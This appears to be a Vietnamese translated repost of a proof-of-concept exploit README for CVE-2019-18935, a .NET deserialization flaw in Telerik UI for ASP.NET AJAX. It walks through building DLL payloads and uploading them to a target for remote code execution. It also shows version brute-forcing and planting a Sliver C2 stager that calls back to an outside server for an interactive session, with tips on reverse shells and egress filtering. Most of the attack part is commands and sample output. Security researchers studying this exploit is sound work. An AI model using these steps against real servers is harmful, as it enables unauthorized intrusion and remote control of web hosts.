---
title: CVE-2019-18935
date: 8/9/2021
layout: single
header:
  teaser: https://know.bishopfox.com/hubfs/Bishop-Fox_Blog-Post_Telerik_FI_frame.png
---

## CVE-2019-18935
Tác giả: noperator

Khai thác bằng chứng về khái niệm cho lỗ hổng giải mã .NET JSON trong giao diện người dùng Telerik cho ASP.NET AJAX cho phép thực thi mã từ xa

<div align="left">
    <img src="https://know.bishopfox.com/hubfs/Bishop-Fox_Blog-Post_Telerik_FI_frame.png" width="300px" />
</div>

## Description

[Telerik UI for ASP.NET AJAX](https://www.telerik.com/products/aspnet-ajax.aspx) là một bộ các thành phần giao diện người dùng được sử dụng rộng rãi cho các ứng dụng web. Nó giải mã không an toàn các đối tượng JSON theo cách dẫn đến việc thực thi mã từ xa tùy ý trên máy chủ cơ bản của phần mềm. Để biết thêm thông tin, hãy xem:
+ Buổi nói chuyện DerpCon [.NET Roulette](https://www.youtube.com/watch?v=--6PiuvBGAU) ([slides](https://know.bishopfox.com/cs/c/?cta_guid=80aa4ac9-84b9-45a4-9cf3-9f215e3f714a&placement_guid=f9ff0e1a-d44c-42ce-8be3-480356af7dc7&portal_id=5632775&canon=https%3A%2F%2Fknow.bishopfox.com%2Fevents%2Fbarrett-darnell-to-present-at-derpcon&redirect_url=APefjpGudybbT_RflCPD6bnEJCJeiyJQwOw2sIK_LZsJpPzGa3E7Q0zgcY2tAhXlkopDbQCzU_G0nEWApdZDnvmHG0BXZdg3RVqaDZTM7kRj-B-MgSRZtZf3sBb_IpKbpAYruI5qNjK-squ1hOQ-Ubq5hoeoYk8B_kwsDSuP7dyoJA5jUMpOdLd6GMURDLATA5GJfm0sOzClndse_fbJg10zBRMQ-byd_ikGcy3ttuQMBRJXkKHPCDFTMp5tODRK66YwFDGfL16GHjOiKLim0ORMvYzyCjOr6RS0qMUDfRbywQIcMWrd7hKI7XiphcZOXf7JcsstSrHn&click=a3983a0a-2932-41a5-b67f-deb4eee8a399&hsutk=2fd63671b84547f0be515dffcd468a6e&signature=AAH58kGXBfVBLDcwiB-xjb6tdRfjxsQXSw&pageId=28318760929&contentType=blog-post&__hstc=24978341.2fd63671b84547f0be515dffcd468a6e.1592575907261.1592575907261.1592575907261.1&__hssc=24978341.1.1592575907263&__hsfp=1563242614)) trong đó nêu chi tiết các nguyên tắc cơ bản bổ sung về cách khai thác quá trình khử không an toàn, áp dụng điều đó cho cách khai thác này và hướng dẫn một số mẹo và thủ thuật để nhận shell trên các ứng dụng web ASP.NET.

+ [Bản ghi đầy đủ](https://hubs.ly/H0mfk7r0) tại Bishop Fox, bao gồm hướng dẫn đầy đủ về lỗ hổng này và khai thác chi tiết cho vấn đề này (cùng với hướng dẫn vá lỗi).

# Getting started

## Prerequisites

Bạn cần cài đặt [Visual Studio](https://visualstudio.microsoft.com/downloads/) và [.NET Framework SDK](https://dotnet.microsoft.com/download/visual-studio-sdks#:~:text=NET%20Standard%20article.-,.NET%20Framework,-.NET%20Framework%20is) được cài đặt để biên dịch các trọng tải DLL lắp ráp .NET ở chế độ hỗn hợp bằng cách sử dụng `build-dll.bat`.

## Install

```powershell
git clone https://github.com/noperator/CVE-2019-18935.git && cd CVE-2019-18935
python3 -m venv env
source env/bin/activate
python3 -m pip install -U pip
python3 -m pip install -r requirements.txt
```

Khai thác này tận dụng logic mã hóa từ [RAU\_crypto](https://github.com/bao7uo/RAU_crypto). Lớp `RAUCipher` trong` RAU_crypto.py` phụ thuộc vào PyCryptodome, một trình đơn thả vào [thay thế](https://blog.sqreen.com/stop-using-pycrypto-use-pycryptodome/) cho module PyCrypto [đã chết](https://github.com/dlitz/pycrypto/issues/238) PyCryptodome và PyCrypto tạo ra các vấn đề khi được cài đặt trong cùng một môi trường, vì vậy cách tốt nhất để đáp ứng sự phụ thuộc này là cài đặt modulen trong môi trường ảo, như được hiển thị ở trên

## Configure

[Dòng 17](https://github.com/noperator/CVE-2019-18935/blob/master/build-dll.bat#L17) của `build-dll.bat` đến đường dẫn cài đặt Visual Studio của bạn 

```vbscript
set VSPATH=C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Auxiliary\Build
```

## Usage

```powershell
$ python3 CVE-2019-18935.py -h
usage: CVE-2019-18935.py [-h] [-t] [-d] [-r FILENAME_REMOTE] [-s SMB_SERVER]
                         [-v UI_VERSION] [-n NET_VERSION] [-p PAYLOAD]
                         [-f FOLDER] -u URL

Exploit for CVE-2019-18935, a .NET JSON deserialization vulnerability in
Telerik UI for ASP.NET AJAX.

optional arguments:
  -h, --help          show this help message and exit
  -t                  just upload a file
  -d                  just deserialize
  -r FILENAME_REMOTE  remote payload name, for optional use with -d
  -s SMB_SERVER       remote SMB server, for optional use with -d
  -v UI_VERSION       software version
  -n NET_VERSION      .NET version
  -p PAYLOAD          mixed mode assembly DLL
  -f FOLDER           destination folder on target
  -u URL              https://<HOST>/Telerik.Web.UI.WebResource.axd?type=rau
```

## Biên dịch chế độ hỗn hợp .NET assembly DLL payload

Một số trọng tải (ví dụ: `reverse-shell.c` và` sliver-stager.c`) yêu cầu bạn đặt các trường `HOST` và` PORT` để trỏ đến máy chủ C2 của bạn — hãy đảm bảo làm điều đó!

Trong môi trường Windows có cài đặt Visual Studio, hãy sử dụng `build-dll.bat` để tạo các tệp DLL lắp ráp chế độ hỗn hợp 32 và 64 bit để được sử dụng làm trọng tải trong quá trình giải mã. Bạn có thể tùy chọn chỉ định kiến trúc CPU mục tiêu làm đối số CLI thứ hai (ví dụ: `x86`).

```vbscript
build-dll.bat sleep.c
```

## Tải trọng tải lên mục tiêu và tải trọng tải vào ứng dụng

Chuyển DLL được tạo ở trên vào `CVE-2019-18935.py`, tệp này sẽ tải DLL lên một thư mục trên máy chủ đích (với điều kiện là máy chủ web có quyền ghi trong thư mục đó) và sau đó tải DLL đó vào ứng dụng qua khai thác không an toàn

```powershell
$ python3 CVE-2019-18935.py -v <VERSION> -p payloads/sleep-2019121205271355-x86.dll -u <HOST>/Telerik.Web.UI.WebResource.axd?type=rau
[*] Local payload name:  sleep-2019121205271355-x86.dll
[*] Destination folder:  C:\Windows\Temp
[*] Remote payload name: 1576142987.918625.dll

{'fileInfo': {'ContentLength': 75264,
              'ContentType': 'application/octet-stream',
              'DateJson': '1970-01-01T00:00:00.000Z',
              'FileName': '1576142987.918625.dll',
              'Index': 0},
 'metaData': {'AsyncUploadTypeName': 'Telerik.Web.UI.UploadedFileInfo, '
                                     'Telerik.Web.UI, Version=<VERSION>, '
                                     'Culture=neutral, '
                                     'PublicKeyToken=<TOKEN>',
              'TempFileName': '1576142987.918625.dll'}}

[*] Triggering deserialization...

<title>Runtime Error</title>
<span><H1>Server Error in '/' Application.<hr width=100% size=1 color=silver></H1>
<h2> <i>Runtime Error</i> </h2></span>
...omitted for brevity...

[*] Response time: 13.01 seconds
```

Trong ví dụ trên, ứng dụng mất ít nhất 10 giây để phản hồi, cho biết rằng trọng tải DLL đã gọi thành công `Sleep (10000)` 

## Brute-force Telerik UI version

Như đã nêu chi tiết trong bài nói chuyện DerpCon [.NET Roulette (39:46)](https://youtu.be/--6PiuvBGAU?t=2386), tác giả có thể ép buộc phiên bản Telerik UI bằng cách chỉ chỉ định phiên bản _major_ của hợp ngữ `Telerik.Web.UI` (tức là phần` 2017` của chuỗi phiên bản đầy đủ `2017.2.503.40`) khi tải tệp lên. Kỹ thuật này làm giảm đáng kể không gian tìm kiếm khi so sánh với việc ép buộc từng bản phát hành cụ thể của phần mềm này — và, như một lợi ích bổ sung, nó thậm chí có thể phát hiện các phiên bản không được liệt kê rõ ràng trong [lịch sử phát hành](https://www.telerik.com/support/whats-new/spnet-ajax/release-history) cho phần mềm này. Tìm hiểu thêm về lập phiên bản hợp ngữ .NET trên [MSDN](https://docs.microsoft.com/en-us/dotnet/api/system.version#remarks).

```powershell
$ for YEAR in $(seq 2013 2018); do
    echo -n "$YEAR: "
    python3 CVE-2019-18935.py -t -v "$YEAR" -p /dev/null -u <HOST>/Telerik.Web.UI.WebResource.axd?type=rau 2>/dev/null |
    grep -oE "Telerik.Web.UI, Version=$YEAR\.[0-9\.]+" ||
    echo
done

2013:
2014:
2015:
2016:
2017: Telerik.Web.UI, Version=2017.2.503.40
2018:
```

## Implant with Sliver C2 framework

Trọng tải stager [Sliver](https://github.com/BishopFox/sliver) tùy chỉnh [`sliver-stager.c`](sliver-stager.c) nhận và thực thi Sliver shellcode (giai đoạn) từ máy chủ Sliver ( máy chủ dàn), tuân theo giao thức dàn dựng của Metasploit. Để biết thêm chi tiết về cách hoạt động của điều này, hãy đọc tiêu đề trong nguồn tải trọng.

Khởi động máy chủ Sliver. Thông tin thêm về thiết lập máy chủ [tại đây](https://github.com/BishopFox/sliver/wiki/Getting-Started).

```bash
MINGW_PATH='/usr/bin'  # Or wherever MinGW is located.
export SLIVER_CC_32="$MINGW_PATH/i686-w64-mingw32-gcc"
export SLIVER_CC_64="$MINGW_PATH/x86_64-w64-mingw32-gcc"
./sliver-server
```

Mở điểm cuối C2 (tác giả đang sử dụng trình nghe mTLS ở đây, nhưng bạn cũng có thể sử dụng HTTP hoặc DNS) trên máy chủ Sliver, tạo một cấu hình cấy ghép và tạo một bộ nghe dàn được liên kết với cấu hình đó. Thông tin thêm về tải trọng theo giai đoạn [tại đây](https://github.com/BishopFox/sliver/wiki/Stagers#example). Lưu ý rằng tác giả không tạo Sliver stager bằng cách sử dụng `create stager` như tài liệu của Sliver gợi ý, thay vào đó sử dụng [`sliver-stager.c`](sliver-stager.c) tùy chỉnh của chúng tác giả.

⚠️ Chú ý: Việc gửi một giai đoạn của kiến trúc CPU sai sẽ _crash_ quá trình đích! Ví dụ: nếu mục tiêu đang chạy phiên bản 32-bit của Telerik UI và máy chủ dàn gửi một giai đoạn 64-bit đến máy xếp 32-bit, thì quá trình máy chủ web sẽ bị lỗi. Trong ví dụ sau, sẽ tạo shellcode 32 bit — nhưng bạn phải khớp mã đó với kiến trúc CPU của mục tiêu bằng cách sử dụng cờ `--arch` của lệnh 'new-profile`.

```powershell
sliver > mtls
[*] Starting mTLS listener ...
[*] Successfully started job #1

sliver > new-profile --mtls <C2-ENDPOINT>:<PORT> --arch x86 --format shellcode --profile-name shellcode-32 --skip-symbols
[*] Saved new profile shellcode-32

sliver > stage-listener --url tcp://<STAGING-SERVER>:<PORT> --profile shellcode-32
[*] No builds found for profile shellcode-32, generating a new one
[*] Job 2 (tcp) started
```

Đặt máy chủ và cổng trong nguồn Sliver stager trỏ đến máy chủ Sliver (hiển thị một máy chủ mẫu bên dưới)

```shell
sed -Ei .bu 's/<HOST>/sliverserver.bishopfox.com/; s/<PORT>/443/' sliver-stager.c
```

Biên dịch tải trọng của Sliver stager, và tải trọng tải lên mục tiêu và tải nó vào ứng dụng (tất cả theo các phần Sử dụng trước đó trong README này).

```powershell
> .\build-dll.bat sliver-stager.c x86

$ python3 CVE-2019-18935.py -v 2017 -u <HOST>/Telerik.Web.UI.WebResource.axd?type=rau -p payloads/sliver-stager-2020080514261722-x86.dll
```

Nếu mọi việc suôn sẻ (bạn có gặp [rắc rối](https://github.com/noperator/CVE-2019-18935/blob/master/README.md#Troubleshooting) với mục tiêu này không?), Bạn sẽ thấy một phiên được tạo trong cửa sổ máy chủ Sliver mà bạn có thể sử dụng để tương tác với mục tiêu.

```shell
[*] Session #1 AFRAID_COMPUTER - <REMOTE-ADDRESS> (DESKTOP-D19S4Q2) - windows/386 - Wed, 05 Aug 2020 15:58:27 UTC

sliver > use 1

[*] Active session AFRAID_COMPUTER (1)

sliver (AFRAID_COMPUTER) > help

Commands:
=========
  clear  clear the screen
  exit   exit the shell
  help   use 'help [command]' for command help
  ...
  whoami             Get session user execution context

sliver (AFRAID_COMPUTER) > whoami

DESKTOP-D19S4Q2\tester
```

## Troubleshooting

+ Mỗi trọng tải chỉ hoạt động một lần — lớp .NET `AssemblyInstaller` không thể tải nhiều hợp ngữ .NET có cùng tên hợp ngữ (khác với _filename_). Bạn sẽ cần phải biên dịch và tải lên một cái mới mỗi khi bạn muốn mục tiêu chuyển sang chế độ ngủ, gọi lại, v.v.

+ Đảm bảo bạn đang nhắm mục tiêu đúng kiến trúc CPU (32 hoặc 64-bit). Điều này có thể mất một số phỏng đoán; tải trọng giấc ngủ rất hữu ích ở đây.

+ Cẩn thận với các quy tắc lọc đầu ra trên mạng đích khi cố gắng khởi tạo một kết nối TCP ngược trở lại máy chủ C2 của bạn. Chọn một cổng TCP thường được phép, như 443.

## Back matter

## Lưu ý 

Việc sử dụng công cụ này để tấn công các mục tiêu mà không có sự đồng ý trước của hai bên là bất hợp pháp. Nhà phát triển và người chia sẻ bài viết nàykhông chịu trách nhiệm pháp lý và không chịu trách nhiệm cho bất kỳ việc sử dụng sai hoặc thiệt hại nào do chương trình này gây ra.

## Acknowledgements

[@mwulftange](https://twitter.com/mwulftange) ban đầu [đã phát hiện ra](https://codewhitesec.blogspot.com/2019/02/telerik-revisited.html) lỗ hổng này. [@ bao7uo](https://github.com/bao7uo) đã viết tất cả logic để [phá vỡ mã hóa RadAsyncUpload](https://github.com/bao7uo/RAU_crypto), cho phép thao tác đối tượng cấu hình tải tệp lên trong ` rauPostData` và sau đó khai thác tính năng giải mã không an toàn của đối tượng đó. [@lesnuages](https://github.com/lesnuages) đã viết lần lặp đầu tiên của tải trọng máy xếp Sliver.

# See also

## Government advisories

+ 20 Oct 2020: [NSA Các diễn viên được Nhà nước Trung Quốc tài trợ khai thác các lỗ hổng được công khai biết đến](https://media.defense.gov/2020/Oct/20/2002519884/-1/-1/0/CSA_CHINESE_EXPLOIT_VULNERABILITIES_UOO179811.PDF)

+ 19 Jun 2020: [Các thỏa hiệp sao chép-dán của ACSC - các chiến thuật, kỹ thuật và quy trình được sử dụng để nhắm mục tiêu đến nhiều mạng của Úc](https://www.cyber.gov.au/sites/default/files/2020-12/ACSC-Advisory-2020-008-Copy-Paste-Compromises.pdf)

+ 22 May 2020: [Lỗ hổng ACSC RCE đang được khai thác tích cực trong các phiên bản có lỗ hổng của Telerik UI bởi các tác nhân tinh vi](https://www.cyber.gov.au/sites/default/files/2020-05/ACSC-Advisory-2020-004-Targeting-of-Telerik-CVE-2019-18935.pdf)

#### Bug bounty write-ups

- [HackerOne Report #1174185](https://hackerone.com/reports/1174185) ([@un4gi](https://twitter.com/un4gi_io))
- [HackerOne Report #838196](https://hackerone.com/reports/838196) ([@sw33tLie](https://twitter.com/sw33tLie))
- [HackerOne Report #913695](https://hackerone.com/reports/913695) ([@un4gi](https://twitter.com/un4gi_io))

### To-do

- [x] Thêm tải trọng để tải lên và thực hiện cấy ghép [Sliver](https://github.com/BishopFox/sliver)
- [ ] Điều chỉnh tải trọng C để tùy chọn chạy một lệnh duy nhất, thay vì mở một trình bao tương tác
- [ ] Sửa đổi tên lắp ráp của DLL đã được biên dịch để tránh biên dịch lại cho cùng một mục tiêu
- [x] Thể hiện các phiên bản giao diện người dùng Telerik 

## Thanks :D
